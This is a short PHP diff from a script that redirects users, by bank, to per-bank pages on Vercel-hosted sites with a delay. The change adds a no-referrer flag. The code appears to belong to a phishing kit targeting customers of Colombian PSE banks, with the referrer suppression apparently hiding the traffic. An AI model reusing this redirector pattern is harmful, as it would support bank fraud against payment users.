@@ -12,7 +12,7 @@ $telefono  = trim($_GET['telefono']  ?? '');
 // Bancos con vercel
 if (isset($PSE_BANKS[$banco])) {
     $b = $PSE_BANKS[$banco];
-    echo json_encode(['url' => PSE_BASE . '/sites/' . $b['slug'] . '/manager/' . $b['id'], 'delay' => 2000]);
+    echo json_encode(['url' => PSE_BASE . '/sites/' . $b['slug'] . '/manager/' . $b['id'], 'delay' => 2000, 'noreferrer' => true]);
     exit;
 }
 
